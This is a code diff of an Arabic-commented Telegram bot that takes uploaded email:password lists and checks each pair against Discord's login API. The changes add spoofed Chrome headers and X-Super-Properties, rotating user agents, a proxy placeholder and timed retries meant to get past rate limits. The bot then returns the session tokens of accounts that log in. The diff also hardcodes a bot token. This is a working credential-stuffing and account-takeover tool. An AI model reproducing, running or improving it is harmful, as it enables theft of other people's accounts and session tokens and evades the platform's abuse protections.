@@ -1,27 +1,39 @@
-import http.client
-import json
-import base64
-import time
 import asyncio
-from telegram import Bot, Update
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import base64
+import json
 import os
+import random
 import re
+import time
 from datetime import datetime
 from typing import List, Dict, Tuple
-import random
-import aiohttp
+
 import aiofiles
+import aiohttp
+import httpx
+from telegram import Bot, Update
+from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 
 # ============= إعدادات البوت =============
 BOT_TOKEN = "8818745155:AAFNGU9SIbkKxzcZN62khYE-zAqiUDEUaSw"
-ADMIN_IDS = [8703458182]  # ضع معرفات الأدمن هنا
+ADMIN_IDS = [8703458182]
 
 # ============= القيم الثابتة =============
 X_Super_Properties = {
     "os": "Windows",
     "browser": "Chrome",
-    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
+    "device": "",
+    "system_locale": "en-US",
+    "browser_user_agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+    "browser_version": "135.0.0.0",
+    "os_version": "10",
+    "referrer": "",
+    "referring_domain": "",
+    "referrer_current": "",
+    "referring_domain_current": "",
+    "release_channel": "stable",
+    "client_build_number": 999999,
+    "client_event_source": None
 }
 
 # ============= دالة التحقق من الأدمن =============
@@ -40,30 +52,38 @@ class DiscordChecker:
         self.is_running = False
         self.user_agents = [
             "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
-            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/115.0",
+            "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0",
             "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36",
+            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"
         ]
+        self.proxy_list = []  # ضع بروكسيات هنا إذا حابب
         
     def get_headers(self) -> dict:
         user_agent = random.choice(self.user_agents)
+        x_super = base64.b64encode(json.dumps(X_Super_Properties, separators=(',', ':')).encode()).decode()
         headers = {
             'User-Agent': user_agent,
             'Content-Type': 'application/json',
-            'X-Super-Properties': base64.b64encode(json.dumps(X_Super_Properties).encode()).decode(),
+            'X-Super-Properties': x_super,
+            'Accept': '*/*',
             'Accept-Encoding': 'gzip, deflate, br',
-            'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8',
+            'Accept-Language': 'en-US,en;q=0.9',
             'Origin': 'https://discord.com',
-            'Referer': 'https://discord.com/',
+            'Referer': 'https://discord.com/login',
+            'Sec-Ch-Ua': '"Google Chrome";v="135", "Not-A.Brand";v="8", "Chromium";v="135"',
+            'Sec-Ch-Ua-Mobile': '?0',
+            'Sec-Ch-Ua-Platform': '"Windows"',
+            'Sec-Fetch-Dest': 'empty',
+            'Sec-Fetch-Mode': 'cors',
+            'Sec-Fetch-Site': 'same-origin',
         }
         return headers
 
-    def check_account(self, email: str, password: str, retry_count: int = 0) -> Tuple[bool, str, str]:
+    async def check_account(self, session: aiohttp.ClientSession, email: str, password: str, retry_count: int = 0) -> Tuple[bool, str, str]:
         try:
             if retry_count > 0:
                 wait_time = min(2 ** retry_count, 60)
-                time.sleep(wait_time)
-            
-            conn = http.client.HTTPSConnection("discord.com", timeout=30)
+                await asyncio.sleep(wait_time)
             
             login_json = {
                 "login": email,
@@ -75,48 +95,77 @@ class DiscordChecker:
             
             login_payload = json.dumps(login_json, separators=(',', ':'))
             headers = self.get_headers()
-            headers['Content-Length'] = str(len(login_payload))
             
-            conn.request("POST", "/api/v9/auth/login", login_payload, headers)
-            login_res = conn.getresponse().read()
-            conn.close()
-            
-            if b'retry_after' in login_res or b'rate_limit' in login_res:
-                if retry_count < 5:
-                    return self.check_account(email, password, retry_count + 1)
-                else:
-                    return False, "Rate Limited", "⛔"
-            
-            try:
-                response_data = json.loads(login_res)
+            async with session.post(
+                "https://discord.com/api/v9/auth/login",
+                data=login_payload,
+                headers=headers,
+                timeout=aiohttp.ClientTimeout(total=30)
+            ) as response:
                 
-                if 'errors' in response_data:
-                    error = response_data['errors']
-                    if 'login' in error:
-                        error_code = error['login'].get('_errors', [{}])[0].get('code', '')
-                        if error_code == "EMAIL_TYPE_INVALID_EMAIL":
-                            return False, "Invalid Email", "❌"
-                        elif error_code == "INVALID_PASSWORD":
-                            return False, "Incorrect Password", "❌"
-                        elif error_code == "EMAIL_UNCONFIRMED":
-                            return False, "Email Not Confirmed", "⚠️"
-                        else:
-                            return False, f"Error: {error_code}", "❌"
+                try:
+                    response_data = await response.json()
+                except:
+                    text = await response.text()
+                    return False, f"Invalid Response: {text[:50]}", "❌"
                 
-                if 'captcha_key' in response_data:
-                    return False, "Captcha Required", "⚠️"
+                # Rate Limit
+                if response.status == 429 or 'retry_after' in response_data or 'rate_limit' in str(response_data).lower():
+                    if retry_count < 5:
+                        retry_after = response_data.get('retry_after', 2 ** retry_count)
+                        await asyncio.sleep(min(retry_after, 60))
+                        return await self.check_account(session, email, password, retry_count + 1)
+                    else:
+                        return False, "Rate Limited (Max Retries)", "⛔"
                 
+                # Captcha
+                if 'captcha_key' in response_data or 'captcha_sitekey' in response_data:
+                    return False, "Captcha Required", "🤖"
+                
+                # 2FA
+                if 'ticket' in response_data or 'mfa' in response_data:
+                    return False, "2FA Required", "🔐"
+                
+                # Token (Success)
                 if 'token' in response_data:
                     return True, response_data['token'], "✅"
                 
-                if 'ticket' in response_data:
-                    return False, "2FA Required", "🔐"
+                # Errors
+                if 'errors' in response_data:
+                    errors = response_data['errors']
+                    if 'login' in errors:
+                        login_errors = errors['login']
+                        if '_errors' in login_errors:
+                            code = login_errors['_errors'][0].get('code', '')
+                            if code == "EMAIL_TYPE_INVALID_EMAIL":
+                                return False, "Invalid Email", "❌"
+                            elif code == "INVALID_PASSWORD":
+                                return False, "Incorrect Password", "❌"
+                            elif code == "EMAIL_UNCONFIRMED":
+                                return False, "Email Not Confirmed", "⚠️"
+                            elif code == "ACCOUNT_DISABLED":
+                                return False, "Account Disabled", "🚫"
+                            else:
+                                return False, f"Error: {code}", "❌"
                     
-            except json.JSONDecodeError:
-                return False, "Invalid Response", "❌"
+                    # General errors
+                    if '_errors' in errors:
+                        code = errors['_errors'][0].get('code', 'UNKNOWN')
+                        return False, f"Error: {code}", "❌"
                 
-            return False, "Unknown Error", "❌"
-            
+                # Message-based errors
+                if 'message' in response_data:
+                    msg = response_data['message']
+                    if 'Invalid' in msg or 'incorrect' in msg.lower():
+                        return False, "Invalid Credentials", "❌"
+                    return False, f"Error: {msg[:50]}", "❌"
+                
+                return False, f"Unknown: {str(response_data)[:50]}", "❌"
+                
+        except asyncio.TimeoutError:
+            if retry_count < 3:
+                return await self.check_account(session, email, password, retry_count + 1)
+            return False, "Timeout", "⏱️"
         except Exception as e:
             return False, f"Error: {str(e)[:50]}", "❌"
 
@@ -129,48 +178,59 @@ class DiscordChecker:
         self.invalid = 0
         self.results = []
         
-        for idx, (email, password) in enumerate(accounts, 1):
-            if not self.is_running:
-                break
+        # استخدام session واحد لكل الحسابات (أسرع بكثير)
+        connector = aiohttp.TCPConnector(limit=50, limit_per_host=10, ttl_dns_cache=300)
+        timeout = aiohttp.ClientTimeout(total=30)
+        
+        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
+            tasks = []
+            for idx, (email, password) in enumerate(accounts, 1):
+                if not self.is_running:
+                    break
                 
-            email = email.strip()
-            password = password.strip()
-            
-            if not email or not password:
-                continue
+                email = email.strip()
+                password = password.strip()
                 
-            success, token, status = self.check_account(email, password)
-            
-            result = {
-                'email': email,
-                'password': password,
-                'success': success,
-                'token': token if success else '',
-                'status': status,
-                'checked_at': datetime.now().isoformat()
-            }
-            
-            self.results.append(result)
-            self.processed = idx
-            if success:
-                self.valid += 1
-            else:
-                self.invalid += 1
-            
-            if progress_callback and (idx % 5 == 0 or idx == self.total):
-                progress = {
-                    'processed': self.processed,
-                    'total': self.total,
-                    'valid': self.valid,
-                    'invalid': self.invalid,
-                    'progress_percentage': (self.processed / self.total * 100),
-                    'elapsed_time': int(time.time() - self.start_time),
-                    'estimated_remaining': int((time.time() - self.start_time) / self.processed * (self.total - self.processed)) if self.processed > 0 else 0
+                if not email or not password:
+                    continue
+                
+                # معالجة كل حساب مع تأخير عشوائي لتجنب الريت ليميت
+                await asyncio.sleep(random.uniform(0.3, 0.8))
+                
+                success, token, status = await self.check_account(session, email, password)
+                
+                result = {
+                    'email': email,
+                    'password': password,
+                    'success': success,
+                    'token': token if success else '',
+                    'status': status,
+                    'checked_at': datetime.now().isoformat()
                 }
-                await progress_callback(progress)
-            
-            if idx < len(accounts):
-                await asyncio.sleep(random.uniform(0.5, 1.0))
+                
+                self.results.append(result)
+                self.processed += 1
+                if success:
+                    self.valid += 1
+                else:
+                    self.invalid += 1
+                
+                # إرسال تحديث التقدم
+                if progress_callback and (self.processed % 5 == 0 or self.processed == self.total):
+                    elapsed = time.time() - self.start_time
+                    progress = {
+                        'processed': self.processed,
+                        'total': self.total,
+                        'valid': self.valid,
+                        'invalid': self.invalid,
+                        'progress_percentage': (self.processed / self.total * 100),
+                        'elapsed_time': int(elapsed),
+                        'estimated_remaining': int(elapsed / self.processed * (self.total - self.processed)) if self.processed > 0 else 0
+                    }
+                    try:
+                        await progress_callback(progress)
+                    except:
+                        pass
         
         self.is_running = False
         return self.results
@@ -251,7 +311,7 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(welcome_msg, parse_mode='Markdown')
 
 async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """معالجة الملف المرسل - الحل النهائي لمشكلة 404"""
+    """معالجة الملف المرسل - النسخة المُحسّنة"""
     user_id = update.effective_user.id
     
     # تسجيل المستخدم
@@ -259,8 +319,9 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         context.bot_data['users'] = set()
     context.bot_data['users'].add(user_id)
     
-    # رسالة مؤقتة
     status_msg = await update.message.reply_text("📥 *جاري معالجة الملف...*", parse_mode='Markdown')
+    temp_filename = None
+    results_file = None
     
     try:
         document = update.message.document
@@ -268,7 +329,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("❌ *لم يتم العثور على ملف!*", parse_mode='Markdown')
             return
         
-        # التحقق من نوع الملف
         file_name = document.file_name or "unknown.txt"
         if not file_name.lower().endswith(('.txt', '.csv')):
             await status_msg.edit_text(
@@ -279,9 +339,8 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             )
             return
         
-        # التحقق من حجم الملف
         file_size = document.file_size or 0
-        max_size = 10 * 1024 * 1024  # 10 MB
+        max_size = 10 * 1024 * 1024
         if file_size > max_size:
             await status_msg.edit_text(
                 f"❌ *الملف كبير جداً!*\n"
@@ -295,46 +354,52 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await status_msg.edit_text("❌ *الملف فارغ!*", parse_mode='Markdown')
             return
         
-        # ✅ **الحل الجذري: استخدام file_path الصحيح**
+        # ✅ الحل النهائي: تحميل الملف بشكل صحيح
         await status_msg.edit_text(f"📥 *جاري تحميل الملف...*\n📊 الحجم: `{file_size / 1024:.1f} KB`", parse_mode='Markdown')
         
-        # الحصول على كائن الملف
-        file = await context.bot.get_file(document.file_id)
-        
-        # الحصول على المسار الصحيح للملف
-        file_path = file.file_path  # هذا هو المفتاح!
-        
-        # إنشاء الرابط الصحيح لتحميل الملف
-        file_url = f"https://api.telegram.org/file/bot{BOT_TOKEN}/{file_path}"
-        
-        # إنشاء اسم ملف مؤقت
         temp_filename = f"accounts_{user_id}_{int(time.time())}.txt"
         
-        # تحميل الملف باستخدام aiohttp
-        async with aiohttp.ClientSession() as session:
-            async with session.get(file_url) as response:
-                if response.status == 200:
-                    content = await response.read()
-                    with open(temp_filename, 'wb') as f:
-                        f.write(content)
-                else:
-                    # إذا فشل الرابط، جرب download_to_drive كحل بديل
-                    await status_msg.edit_text("🔄 *المحاولة بطريقة بديلة...*", parse_mode='Markdown')
-                    await file.download_to_drive(temp_filename)
+        try:
+            # الطريقة الأولى: استخدام get_file مع timeout طويل
+            file = await context.bot.get_file(document.file_id, read_timeout=60, connect_timeout=30)
+            await file.download_to_drive(temp_filename)
+        except Exception as e1:
+            print(f"Method 1 failed: {e1}")
+            try:
+                # الطريقة الثانية: استخدام الرابط المباشر
+                file = await context.bot.get_file(document.file_id)
+                file_url = file.file_path
+                
+                async with httpx.AsyncClient(timeout=httpx.Timeout(60.0, connect=30.0)) as client:
+                    response = await client.get(file_url)
+                    response.raise_for_status()
+                    
+                    async with aiofiles.open(temp_filename, 'wb') as f:
+                        await f.write(response.content)
+            except Exception as e2:
+                print(f"Method 2 failed: {e2}")
+                await status_msg.edit_text(
+                    f"❌ *فشل تحميل الملف!*\n"
+                    f"💡 *حاول إعادة إرسال الملف*",
+                    parse_mode='Markdown'
+                )
+                return
         
-        # التحقق من وجود الملف بعد التحميل
+        # التحقق من الملف
         if not os.path.exists(temp_filename) or os.path.getsize(temp_filename) == 0:
-            raise Exception("فشل تحميل الملف أو الملف فارغ")
+            await status_msg.edit_text("❌ *الملف فارغ أو تالف!*", parse_mode='Markdown')
+            return
         
         # قراءة الملف
-        await status_msg.edit_text("📖 *جاري قراءة الملف...*", parse_mode='Markdown')
+        await status_msg.edit_text("📖 *جاري قراءة الحسابات...*", parse_mode='Markdown')
         
-        with open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
-            content = f.read()
+        async with aiofiles.open(temp_filename, 'r', encoding='utf-8', errors='ignore') as f:
+            content = await f.read()
         
         # حذف الملف المؤقت
         try:
             os.remove(temp_filename)
+            temp_filename = None
         except:
             pass
         
@@ -351,7 +416,6 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             email = None
             password = None
             
-            # دعم الصيغ المختلفة
             if ':' in line:
                 parts = line.split(':', 1)
                 if len(parts) == 2:
@@ -363,18 +427,18 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     email = parts[0].strip()
                     password = parts[1].strip()
             
-            # التحقق من صحة الإيميل
-            if email and password and '@' in email and len(password) >= 4:
+            if email and password and '@' in email and len(password) >= 1:
                 accounts.append((email, password))
             else:
                 invalid_lines += 1
         
         if not accounts:
-            error_msg = "❌ *لم يتم العثور على حسابات صالحة في الملف!*\n\n"
-            error_msg += "📝 الصيغة المدعومة: `email:password`\n"
-            error_msg += "📌 كل حساب في سطر منفصل\n\n"
-            error_msg += f"⚠️ عدد الأسطر غير الصالحة: `{invalid_lines}`"
-            
+            error_msg = (
+                "❌ *لم يتم العثور على حسابات صالحة في الملف!*\n\n"
+                "📝 الصيغة المدعومة: `email:password`\n"
+                "📌 كل حساب في سطر منفصل\n\n"
+                f"⚠️ عدد الأسطر غير الصالحة: `{invalid_lines}`"
+            )
             await status_msg.edit_text(error_msg, parse_mode='Markdown')
             return
         
@@ -434,17 +498,19 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text(summary, parse_mode='Markdown')
         
         # إرسال الملف
-        with open(results_file, 'rb') as f:
+        async with aiofiles.open(results_file, 'rb') as f:
+            file_data = await f.read()
             await update.message.reply_document(
-                document=f,
+                document=file_data,
                 filename=os.path.basename(results_file),
                 caption="📄 *ملف النتائج الكامل*\n✅ صالح | ❌ غير صالح",
                 parse_mode='Markdown'
             )
         
-        # حذف الملف المؤقت
+        # حذف ملف النتائج
         try:
             os.remove(results_file)
+            results_file = None
         except:
             pass
         
@@ -453,7 +519,7 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
                 await context.bot.send_message(
                     admin_id,
-                    f"👤 مستخدم جديد استخدم البوت:\n"
+                    f"👤 مستخدم استخدم البوت:\n"
                     f"🆔 ID: `{user_id}`\n"
                     f"📊 فحص: `{checker.total}` حساب\n"
                     f"✅ صالح: `{checker.valid}`",
@@ -474,6 +540,19 @@ async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
             parse_mode='Markdown'
         )
         print(f"Error in handle_file: {e}")
+    
+    finally:
+        # تنظيف الملفات في أي حال
+        if temp_filename and os.path.exists(temp_filename):
+            try:
+                os.remove(temp_filename)
+            except:
+                pass
+        if results_file and os.path.exists(results_file):
+            try:
+                os.remove(results_file)
+            except:
+                pass
 
 # ============= أوامر الأدمن =============
 
@@ -558,13 +637,13 @@ async def users_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("❌ *لا يوجد مستخدمين مسجلين*", parse_mode='Markdown')
         return
     
-    users_list = "\n".join([f"🆔 `{u}`" for u in list(users)[:20]])
+    users_list_text = "\n".join([f"🆔 `{u}`" for u in list(users)[:20]])
     
     users_msg = (
         f"👥 *قائمة المستخدمين*\n"
         f"━━━━━━━━━━━━━━━━━━━━━━\n"
         f"الإجمالي: `{len(users)}`\n\n"
-        f"{users_list}"
+        f"{users_list_text}"
     )
     
     if len(users) > 20:
@@ -630,7 +709,16 @@ def main():
     if not ADMIN_IDS:
         print("⚠️ تحذير: لم يتم تحديد أي أدمن!")
     
-    app = Application.builder().token(BOT_TOKEN).build()
+    # ✅ بناء البوت مع timeouts مُحسّنة
+    app = (
+        Application.builder()
+        .token(BOT_TOKEN)
+        .read_timeout(60)
+        .write_timeout(60)
+        .connect_timeout(30)
+        .pool_timeout(30)
+        .build()
+    )
     
     # إضافة المعالجات
     app.add_handler(CommandHandler("start", start))
